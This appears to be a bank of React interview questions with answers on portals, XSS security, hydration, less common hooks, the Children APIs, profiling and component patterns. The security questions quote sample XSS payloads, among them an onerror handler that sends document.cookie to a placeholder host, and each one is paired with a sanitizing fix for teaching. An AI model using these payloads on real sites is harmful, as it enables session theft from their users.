@section beyond-technical

## tb-portals | Portals | Beyond the roadmap | – | beyond

### Which handler fires when you click inside a portal? @intermediate
```jsx
function Panel() {
  const ref = useRef(null);

  useEffect(() => {
    const node = ref.current;
    const native = () => console.log('native listener');
    node.addEventListener('click', native);
    return () => node.removeEventListener('click', native);
  }, []);

  return (
    <div ref={ref} onClick={() => console.log('React onClick')}>
      {createPortal(<button>Inside portal</button>, document.body)}
    </div>
  );
}
```
What logs when you click **Inside portal**?
-- answer --
Only **"React onClick"**.

- React events propagate through the **React tree**. In that tree the button is a child of the `div`, so the div's `onClick` runs.
- The native listener is attached to the div's **DOM node**. In the DOM the button lives under `document.body`, not inside that div, so the native event never bubbles through it.

This difference explains most portal bugs: React handlers see portal events, while DOM-level code (`addEventListener`, `node.contains(e.target)`) doesn't.

### A dropdown closes when you click inside the modal it opened. Why? @advanced
```jsx
function Dropdown({ children }) {
  const [open, setOpen] = useState(false);
  const ref = useRef(null);

  useEffect(() => {
    function onMouseDown(e) {
      if (!ref.current.contains(e.target)) setOpen(false);   // click outside → close
    }
    document.addEventListener('mousedown', onMouseDown);
    return () => document.removeEventListener('mousedown', onMouseDown);
  }, []);

  return (
    <div ref={ref}>
      <button onClick={() => setOpen(o => !o)}>Menu</button>
      {open && children}   {/* children include a <Modal> rendered through a portal */}
    </div>
  );
}
```
-- answer --
The outside-click check uses the **DOM tree**: `ref.current.contains(e.target)`. The modal's DOM lives under `document.body`, so a click inside it counts as "outside". The dropdown closes, and because the dropdown renders the modal, the modal unmounts too.

Ask the **React tree** instead. React events bubble through portals, so a capture handler on the wrapper sees every mousedown inside its React subtree, including portals, and it runs before the document listener:

```jsx
function Dropdown({ children }) {
  const [open, setOpen] = useState(false);
  const insideRef = useRef(false);

  useEffect(() => {
    function onMouseDown() {
      if (!insideRef.current) setOpen(false);   // Only clicks outside the React subtree close it
      insideRef.current = false;
    }
    document.addEventListener('mousedown', onMouseDown);
    return () => document.removeEventListener('mousedown', onMouseDown);
  }, []);

  return (
    <div onMouseDownCapture={() => { insideRef.current = true; }}>
      <button onClick={() => setOpen(o => !o)}>Menu</button>
      {open && children}
    </div>
  );
}
```

Other options: lift the modal's state up so it isn't rendered inside the dropdown, or use a library (Radix, shadcn/ui) whose dismissable layers already understand nested portals.

### The modal is clipped and appears behind the sticky header. Why, and what fixes it? @intermediate
A `Modal` rendered inside a product card is cut off at the card's edges and shows up underneath the page header, even with `z-index: 9999`.
-- answer --
Two CSS rules trap it:

- **Clipping:** an ancestor has `overflow: hidden` (or `auto`), so anything outside its box is cut off. Even `position: fixed` won't escape an ancestor with `transform`, `filter` or `contain`, because that ancestor becomes the containing block.
- **Stacking:** `z-index` only competes within the nearest **stacking context**. If the card or a parent creates one (`transform`, `opacity` below 1, `position` with a `z-index`, `isolation: isolate`), the modal's 9999 only ranks it inside that context, which as a whole sits below the header.

Fixes:

1. Render the modal with **`createPortal(..., document.body)`**. It leaves those ancestors in the DOM but keeps its place in the React tree, so context and events still work.
2. Or use the native **`<dialog>` opened with `showModal()`**. It renders in the browser's top layer, above everything, regardless of `z-index`.

## tb-security | Security | Beyond the roadmap | – | beyond

### Spot the vulnerabilities in this comment component @intermediate
```jsx
function Comment({ comment }) {
  return (
    <article>
      <a href={comment.author.website}>{comment.author.name}</a>
      <div dangerouslySetInnerHTML={{ __html: comment.body }} />
    </article>
  );
}
```
`comment` comes straight from your API, and any user can write one.
-- answer --
Two stored-XSS holes:

1. **Raw user HTML in `dangerouslySetInnerHTML`.** A body such as `<img src=x onerror="fetch('https://evil.example/?c=' + document.cookie)">` runs in every reader's browser.
2. **A user-controlled `href`.** A website set to `javascript:...` runs script when clicked. Recent React versions block or warn about `javascript:` URLs, but don't rely on that.

```jsx
import DOMPurify from 'dompurify';

function Comment({ comment }) {
  const body = DOMPurify.sanitize(comment.body);
  const website = /^https?:\/\//i.test(comment.author.website ?? '') ? comment.author.website : null;

  return (
    <article>
      {website ? (
        <a href={website} target="_blank" rel="noopener noreferrer nofollow">
          {comment.author.name}
        </a>
      ) : (
        <span>{comment.author.name}</span>
      )}
      <div dangerouslySetInnerHTML={{ __html: body }} />
    </article>
  );
}
```

Even better: if comments don't need formatting, store plain text and render `{comment.body}`. React escapes it automatically.

### Is it safe to spread props that come from a CMS? @intermediate
```jsx
// `block` comes from a headless CMS that marketing editors can edit
function Block({ block }) {
  const Tag = block.tag;          // e.g. "section"
  return <Tag {...block.props}>{block.text}</Tag>;
}
```
-- answer --
No. Spreading an untrusted object lets the data choose **any prop and any tag**:

- `{"dangerouslySetInnerHTML": {"__html": "<img src=x onerror=...>"}}` injects raw HTML.
- `{"href": "javascript:..."}` on an `a`, or `formAction` on a button, can run script.
- `block.tag` could be `iframe` with a `srcdoc` full of script, or an async `script` tag, which React 19 loads when rendered.

Allowlist both tags and props:

```jsx
const ALLOWED_TAGS = new Set(['section', 'p', 'h2', 'h3', 'blockquote']);
const ALLOWED_PROPS = ['id', 'className'];

function Block({ block }) {
  const Tag = ALLOWED_TAGS.has(block.tag) ? block.tag : 'div';
  const props = Object.fromEntries(
    ALLOWED_PROPS
      .filter(key => typeof block.props?.[key] === 'string')
      .map(key => [key, block.props[key]])
  );
  return <Tag {...props}>{block.text}</Tag>;
}
```

Rule: only spread objects whose keys you control. Validate CMS data with a Zod schema where it enters your app.

### Why is this server-rendered data script an XSS risk? @advanced
```jsx
// A server-rendered layout hands initial data to the client
<script
  dangerouslySetInnerHTML={{
    __html: `window.__INITIAL_DATA__ = ${JSON.stringify(data)}`,
  }}
/>
```
`data` includes product reviews written by users.
-- answer --
`JSON.stringify` doesn't escape `<`. If a review contains `</script><script>alert(document.cookie)</script>`, the HTML parser ends your script element at the first `</script>`, and the attacker's script element runs.

Escape `<` before embedding JSON in HTML. `<` is still a valid JSON and JavaScript string escape, so the data is unchanged:

```jsx
function serializeForScript(data) {
  return JSON.stringify(data).replace(/</g, '\\u003c');
}

<script
  dangerouslySetInnerHTML={{
    __html: `window.__INITIAL_DATA__ = ${serializeForScript(data)}`,
  }}
/>
```

Frameworks such as Next.js serialize their own payloads safely; you hit this when you hand-roll server rendering or inject data yourself. Libraries like `serialize-javascript` do the same escaping.

## tb-rendering | Rendering strategies & hydration | Beyond the roadmap | – | beyond

### Find the cause of this hydration mismatch @intermediate
```jsx
function Header() {
  const isMobile = typeof window !== 'undefined' && window.innerWidth < 768;
  return isMobile ? <MobileNav /> : <DesktopNav />;
}
```
On phones, server-rendered pages report a hydration error and the header flickers.
-- answer --
On the server there's no `window`, so it renders `<DesktopNav />`. On a phone, the first client render sees a narrow window and renders `<MobileNav />`. The first client render must match the server HTML, so React reports a mismatch and rebuilds that part on the client, which causes the flicker and wastes the server render.

Fixes, best first:

1. **Use CSS** when only the layout differs: render both and hide one with media queries (`md:hidden` and `hidden md:flex` in Tailwind). No JavaScript, no mismatch, no flash.
2. **Render the server value first, then switch after hydration**, with `useSyncExternalStore` and a server snapshot (see `useMediaQuery` in the coding section). This accepts a brief switch on phones.
3. **Decide on the server** when the device type really matters, for example from a client hint or a cookie, and pass it down.

### Why does a div inside a p cause a hydration error? @intermediate
```jsx
function ProductSummary({ product }) {
  return (
    <p className="summary">
      {product.name}
      <div className="price">${product.price}</div>
    </p>
  );
}
```
-- answer --
It's **invalid HTML**: a `<p>` can't contain block elements such as `<div>`. When the browser parses the server HTML, it closes the `<p>` as soon as it meets the `<div>`, producing `<p>Name</p><div>…</div><p></p>`. The real DOM no longer matches the tree React expects, so hydration fails. In a client-only app, React logs a warning about the invalid nesting instead.

Fix the markup:

```jsx
<div className="summary">
  <p>{product.name}</p>
  <p className="price">${product.price}</p>
</div>
```

Other nesting the parser rewrites: an `<a>` inside another `<a>`, and a `<tr>` placed directly inside `<table>` (the parser inserts a `<tbody>`).

### Which rendering strategy would you choose for each page? @intermediate
An online store has (1) a marketing landing page, (2) 5,000 product pages whose stock changes hourly, (3) a blog, (4) a logged-in account dashboard and (5) search results for any query. Choose a rendering strategy for each and justify it.
-- answer --
| Page | Strategy | Why |
|---|---|---|
| Landing page | Static (SSG) | Same for everyone; fastest possible; great for SEO |
| Product pages | Static with revalidation (ISR), live stock streamed or fetched separately | Static HTML for speed and SEO; revalidate hourly or on demand when stock changes; a small dynamic part shows exact stock |
| Blog | Static, revalidated when a post is published or edited | Content changes rarely |
| Account dashboard | Per request (SSR with Server Components and streaming), or client-rendered | Personal data, no SEO value |
| Search results | Per request (SSR) | Unlimited queries can't be pre-built; server rendering keeps results shareable through URL params and indexable |

In Next.js App Router you express these through how each route reads and caches data, not by choosing a mode by name. In the interview, explain the trade-off in plain terms: freshness against speed and cost.

## tb-hooks | Less common hooks | Beyond the roadmap | – | beyond

### What's wrong with generating ids like this? @intermediate
```jsx
let nextId = 0;

function Checkbox({ label }) {
  const id = `checkbox-${nextId++}`;
  return (
    <>
      <input type="checkbox" id={id} />
      <label htmlFor={id}>{label}</label>
    </>
  );
}
```
-- answer --
Three problems:

1. **Impure render.** Incrementing a module variable while rendering is a side effect. Every re-render (and Strict Mode's double render) produces a new id.
2. **Hydration mismatch.** The server's counter keeps growing across every request it handles, while each browser starts from 0, so server and client ids differ.
3. **Unstable ids.** Because the id changes on re-render, anything referencing it (`aria-describedby`, tests, CSS) breaks.

Use `useId`, which is stable for each component instance and identical on server and client:

```jsx
function Checkbox({ label }) {
  const id = useId();
  return (
    <>
      <input type="checkbox" id={id} />
      <label htmlFor={id}>{label}</label>
    </>
  );
}
```

Simpler still for this case: wrap the input in the label (`<label><input type="checkbox" /> {label}</label>`), which needs no id.

### Why does this useSyncExternalStore call loop forever? @advanced
```jsx
function useWindowSize() {
  return useSyncExternalStore(
    callback => {
      window.addEventListener('resize', callback);
      return () => window.removeEventListener('resize', callback);
    },
    () => ({ width: window.innerWidth, height: window.innerHeight })
  );
}
```
React warns that the result of `getSnapshot` should be cached, then fails with "Maximum update depth exceeded".
-- answer --
`getSnapshot` returns a **new object on every call**. React calls it repeatedly and compares the results with `Object.is`. A new object always looks like a change, so React re-renders forever.

There's a second problem: `subscribe` is a new function on every render, so React unsubscribes and resubscribes each time.

Return primitives (or a cached object) and define `subscribe` outside the component:

```jsx
function subscribe(callback) {
  window.addEventListener('resize', callback);
  return () => window.removeEventListener('resize', callback);
}

export function useWindowSize() {
  const width = useSyncExternalStore(subscribe, () => window.innerWidth, () => 0);
  const height = useSyncExternalStore(subscribe, () => window.innerHeight, () => 0);
  return { width, height };
}
```

## tb-nojsx | React without JSX | Beyond the roadmap | – | beyond

### What does Children.count return here? @intermediate #legacy
```jsx
import { Children } from 'react';

function Count({ children }) {
  return <p>{Children.count(children)}</p>;
}

<Count>
  <span>A</span>
  {null}
  {['B', 'C']}
  <>
    <span>D</span>
    <span>E</span>
  </>
</Count>
```
-- answer --
It renders **5**.

| Child | Counted as |
|---|---|
| `<span>A</span>` | 1 |
| `{null}` | 1 (empty nodes are counted) |
| `{['B', 'C']}` | 2 (arrays are flattened; each item counts) |
| `<>…</>` | 1 (fragments aren't looked inside) |

So `Children.count` reflects the JSX structure, not what appears on screen: the fragment renders two spans, and `null` renders nothing. `Children.toArray(children).length` would be **4**, because `toArray` drops empty nodes. This fragility is why React's docs list `Children` as a legacy API.

### What's the bug in this cloneElement call? @intermediate #legacy
```jsx
function Toolbar({ children }) {
  return Children.map(children, child => cloneElement(child, { size: 'sm' }));
}

<Toolbar>
  <Button size="lg">Save</Button>
  <Tooltip text="Undo">
    <Button>Undo</Button>
  </Tooltip>
</Toolbar>
```
-- answer --
Two bugs:

1. **It silently overrides the caller.** `cloneElement` merges new props over existing ones, so the explicit `size="lg"` on Save becomes `"sm"`, with no warning.
2. **It targets the wrong element.** The second child is the `<Tooltip>`, not the `<Button>` inside it. `Tooltip` receives a `size` prop it probably ignores, and the inner button never gets it.

Provide the default through context instead, and let explicit props win:

```jsx
const ToolbarContext = createContext({ size: 'md' });

function Toolbar({ size = 'sm', children }) {
  return (
    <ToolbarContext value={{ size }}>
      <div role="toolbar">{children}</div>
    </ToolbarContext>
  );
}

function Button({ size, ...props }) {
  const toolbar = useContext(ToolbarContext);
  return <button data-size={size ?? toolbar.size} {...props} />;
}
```

Now `<Button size="lg">` keeps `lg`, and a button nested inside a tooltip still gets the toolbar's size.

## tb-profiler | The Profiler API | Beyond the roadmap | – | beyond

### onRender shows actualDuration close to baseDuration on every update. What does that mean? @advanced
These logs appear every time the user types in the page's search box:

```text
ProductTable update   actualDuration: 41.8 ms   baseDuration: 43.1 ms
ProductTable update   actualDuration: 40.9 ms   baseDuration: 43.0 ms
```
-- answer --
`baseDuration` estimates the cost of re-rendering the whole subtree with **no** memoization; `actualDuration` is what this commit really spent. When they're almost equal, **nothing in the table is being skipped**: every row re-renders on every keystroke, even though the table data probably didn't change.

Next steps:

1. Find out why the table re-renders at all: the DevTools Profiler shows why each component rendered. Typically the search state lives above the table, or the table receives new object or function props on every render.
2. Move the search state down, or memoize: enable the React Compiler, or wrap the table and rows in `memo` with stable props.
3. If the table really must update (it filters by the search), keep typing responsive with `useDeferredValue` and render fewer rows (virtualization).

After a fix, a healthy log shows `actualDuration` far below `baseDuration` on keystrokes, for example 2 ms against 43 ms.

## tb-patterns | Component patterns | Beyond the roadmap | – | beyond

### A Card component has grown to 25 props. How do you refactor it? @intermediate
```jsx
<Card
  title="Q3 revenue" subtitle="vs last quarter" icon="chart" iconColor="green"
  showMenu menuItems={items} onMenuSelect={handleMenu}
  footerText="Updated 5 min ago" footerAction="Refresh" onFooterAction={refresh}
  badge="New" badgeColor="blue" compact bordered loading={isLoading}
>
  <RevenueChart />
</Card>
```
-- answer --
The component tries to predict every layout through configuration ("prop explosion"). Each new need adds props, combinations become impossible to test, and callers can't customize anything you didn't anticipate. Switch to **composition**: small parts that callers arrange themselves.

```jsx
<Card>
  <Card.Header>
    <ChartIcon className="text-green-600" />
    <div>
      <Card.Title>Q3 revenue</Card.Title>
      <Card.Description>vs last quarter</Card.Description>
    </div>
    <Badge>New</Badge>
    <CardMenu items={items} onSelect={handleMenu} />
  </Card.Header>
  <Card.Content>{isLoading ? <Skeleton /> : <RevenueChart />}</Card.Content>
  <Card.Footer>
    Updated 5 min ago
    <Button variant="ghost" onClick={refresh}>Refresh</Button>
  </Card.Footer>
</Card>
```

- Each part is a simple styled component; shadcn/ui's Card works exactly this way.
- Keep a few props for genuine variants (`variant="compact"`), and use `children` or element props (`icon={<ChartIcon />}`) for content.
- Shared behaviour (an open menu, a selection) goes in context or a headless hook.

### This Toggle ignores updates from its parent. Why? @intermediate
```jsx
function Toggle({ pressed, onPressedChange }) {
  const [on, setOn] = useState(pressed);
  return (
    <button aria-pressed={on} onClick={() => { setOn(!on); onPressedChange(!on); }}>
      {on ? 'On' : 'Off'}
    </button>
  );
}

// The parent's "Reset all" button sets every `pressed` to false, but toggles still show "On"
```
-- answer --
The prop is copied into state **once**, on mount. After that there are two sources of truth: the toggle's own `on` and the parent's `pressed`. When the parent changes `pressed`, nothing updates `on`.

Pick one owner. **Fully controlled** (the parent owns it) means no internal state at all:

```jsx
function Toggle({ pressed, onPressedChange }) {
  return (
    <button aria-pressed={pressed} onClick={() => onPressedChange(!pressed)}>
      {pressed ? 'On' : 'Off'}
    </button>
  );
}
```

To support both uses, apply the **controllable state** pattern (theory section): use internal state only when `pressed` is undefined, with `defaultPressed` as the starting value.

Don't patch it with an effect that copies `pressed` into `on`. That's synced derived state: it renders once with the stale value, then again with the right one.
